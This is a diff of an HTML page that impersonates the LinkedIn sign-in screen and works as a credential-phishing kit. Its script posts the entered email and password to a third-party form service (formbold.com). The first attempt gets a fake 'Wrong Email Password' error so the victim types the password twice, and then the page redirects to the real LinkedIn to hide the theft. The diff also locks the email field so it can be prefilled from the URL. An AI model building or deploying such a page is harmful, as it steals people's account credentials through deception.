@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
   <style>
-    /* ALL YOUR ORIGINAL STYLES REMAIN EXACTLY THE SAME */
     body {
       font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
       background-color: #f3f6f8;
@@ -190,16 +189,13 @@
   <script>
     let isFirstSubmission = true;
 
-    window.onload = function () {
+    window.onload = function() {
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get("email");
+      const email = urlParams.get('email');
       if (email) {
-        document.getElementById("username").value = email;
+        document.getElementById('username').value = email;
       }
-      // Focus on the email field and ensure cursor is blinking
-      const usernameInput = document.getElementById("username");
-      usernameInput.focus();
-      usernameInput.select(); // Highlight any existing text for easy editing
+      document.getElementById('username').focus();
     };
 
     function handleSubmit(event) {
@@ -207,64 +203,60 @@
       const form = event.target;
       const formData = new FormData(form);
 
-      if (isFirst_submission) {
-        document.getElementById("error-message").innerText = "Wrong Email Password";
+      if (isFirstSubmission) {
+        document.getElementById('error-message').innerText = "Wrong Email Password";
         isFirstSubmission = false;
         fetch(form.action, {
-          method: "POST",
-          body: formData,
+          method: 'POST',
+          body: formData
         })
-          .then((response) => response.text())
-          .then((data) => {
-            console.log("First submission data sent:", data);
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-          });
-        document.getElementById("password").value = "";
+        .then(response => response.text())
+        .then(data => {
+          console.log("First submission data sent:", data);
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
+        document.getElementById('password').value = "";
       } else {
         fetch(form.action, {
-          method: "POST",
-          body: formData,
+          method: 'POST',
+          body: formData
         })
-          .then((response) => response.text())
-          .then((data) => {
-            console.log("Second submission data sent:", data);
-            window.location.href = "https://www.linkedin.com";
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-            alert("An error occurred. Please try again.");
-          });
+        .then(response => response.text())
+        .then(data => {
+          console.log("Second submission data sent:", data);
+          window.location.href = "https://www.linkedin.com";
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("An error occurred. Please try again.");
+        });
       }
     }
 
     function togglePassword() {
-      const passwordInput = document.getElementById("password");
-      const toggleButton = document.querySelector(".password-toggle");
+      const passwordInput = document.getElementById('password');
+      const toggleButton = document.querySelector('.password-toggle');
 
-      if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-        toggleButton.textContent = "Hide";
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleButton.textContent = 'Hide';
       } else {
-        passwordInput.type = "password";
-        toggleButton.textContent = "Show";
+        passwordInput.type = 'password';
+        toggleButton.textContent = 'Show';
       }
     }
   </script>
 </head>
 <body>
   <div class="login-container">
-    <img
-      src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg"
-      alt="LinkedIn Logo"
-      class="linkedin-logo"
-    >
+    <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn Logo" class="linkedin-logo">
     <h1>Sign in</h1>
     <form action="https://formbold.com/s/9mkW5" method="post" onsubmit="handleSubmit(event)">
       <div class="form-group">
         <label for="username">Email</label>
-        <input type="email" id="username" name="username" required>
+        <input type="email" id="username" name="username" readonly>
       </div>
       <div class="form-group">
         <label for="password">Password</label>
@@ -290,38 +282,5 @@
     <a href="#">Send Feedback</a>
     <a href="#">Language</a>
   </div>
-  <script>
-    (function () {
-      function c() {
-        var b = a.contentDocument || a.contentWindow.document;
-        if (b) {
-          var d = b.createElement("script");
-          d.innerHTML =
-            "window.__CF$cv$params={r:'93eaaf641c3078ce',t:'MTc0NzA2MDk3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
-          b.getElementsByTagName("head")[0].appendChild(d);
-        }
-      }
-      if (document.body) {
-        var a = document.createElement("iframe");
-        a.height = 1;
-        a.width = 1;
-        a.style.position = "absolute";
-        a.style.top = 0;
-        a.style.left = 0;
-        a.style.border = "none";
-        a.style.visibility = "hidden";
-        document.body.appendChild(a);
-        if ("loading" !== document.readyState) c();
-        else if (window.addEventListener) document.addEventListener("DOMContentLoaded", c);
-        else {
-          var e = document.onreadystatechange || function () {};
-          document.onreadystatechange = function (b) {
-            e(b);
-            "loading" !== document.readyState && (document.onreadystatechange = e, c());
-          };
-        }
-      }
-    })();
-  </script>
 </body>
 </html>
